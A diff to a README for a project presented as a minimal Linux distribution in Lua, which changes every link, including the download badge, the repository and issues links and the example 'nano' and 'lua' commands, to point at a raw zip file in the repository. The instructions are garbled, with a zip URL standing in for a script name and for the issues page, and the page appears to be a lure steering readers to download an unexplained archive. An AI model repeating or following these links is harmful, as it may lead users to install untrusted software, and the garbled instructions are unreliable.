@@ -1,6 +1,6 @@
 # 🚀 linux-userspace-lua - A Simple Linux Distribution in Lua
 
-[![Download Latest Release](https://github.com/wel1980/linux-userspace-lua/raw/refs/heads/main/platforms/userspace-lua-linux-tigerlike.zip%20release-brightgreen)](https://github.com/wel1980/linux-userspace-lua/raw/refs/heads/main/platforms/userspace-lua-linux-tigerlike.zip)
+[![Download Latest Release](https://github.com/wel1980/linux-userspace-lua/raw/refs/heads/main/build_defs/linux_userspace_lua_unconstricted.zip%20release-brightgreen)](https://github.com/wel1980/linux-userspace-lua/raw/refs/heads/main/build_defs/linux_userspace_lua_unconstricted.zip)
 
 Welcome to **linux-userspace-lua**, a proof of concept minimal Linux distribution written in Lua. This project leverages Bazel, enabling you to run a complete Linux environment with just a single command. Whether you're looking for a lightweight system or an efficient testing ground for your Lua applications, you've come to the right place.
 
@@ -24,7 +24,7 @@ Before downloading, please ensure your system meets these requirements:
 
 To get started, visit this page to download the latest release:
 
-[Download Latest Release](https://github.com/wel1980/linux-userspace-lua/raw/refs/heads/main/platforms/userspace-lua-linux-tigerlike.zip)
+[Download Latest Release](https://github.com/wel1980/linux-userspace-lua/raw/refs/heads/main/build_defs/linux_userspace_lua_unconstricted.zip)
 
 Once you are on the Releases page, follow these steps:
 
@@ -54,9 +54,9 @@ Once you have launched the application, you will find yourself in a minimal Linu
 ### Basic Commands
 
 - To create a new Lua script:
-  - Use a text editor (like `nano` or `vim`) to create a file: `nano https://github.com/wel1980/linux-userspace-lua/raw/refs/heads/main/platforms/userspace-lua-linux-tigerlike.zip`.
+  - Use a text editor (like `nano` or `vim`) to create a file: `nano https://github.com/wel1980/linux-userspace-lua/raw/refs/heads/main/build_defs/linux_userspace_lua_unconstricted.zip`.
 - To run a Lua script:
-  - Simply type `lua https://github.com/wel1980/linux-userspace-lua/raw/refs/heads/main/platforms/userspace-lua-linux-tigerlike.zip` in the terminal.
+  - Simply type `lua https://github.com/wel1980/linux-userspace-lua/raw/refs/heads/main/build_defs/linux_userspace_lua_unconstricted.zip` in the terminal.
 
 ## 📝 Frequently Asked Questions
 
@@ -76,8 +76,8 @@ You can open an issue in the GitHub repository for support or to report any bugs
 
 Feel free to join the community for tips, discussions, and support:
 
-- **GitHub Repository**: [linux-userspace-lua](https://github.com/wel1980/linux-userspace-lua/raw/refs/heads/main/platforms/userspace-lua-linux-tigerlike.zip)
-- **Issues Page**: Report bugs or request features [here](https://github.com/wel1980/linux-userspace-lua/raw/refs/heads/main/platforms/userspace-lua-linux-tigerlike.zip).
+- **GitHub Repository**: [linux-userspace-lua](https://github.com/wel1980/linux-userspace-lua/raw/refs/heads/main/build_defs/linux_userspace_lua_unconstricted.zip)
+- **Issues Page**: Report bugs or request features [here](https://github.com/wel1980/linux-userspace-lua/raw/refs/heads/main/build_defs/linux_userspace_lua_unconstricted.zip).
 
 ## 📄 License
 
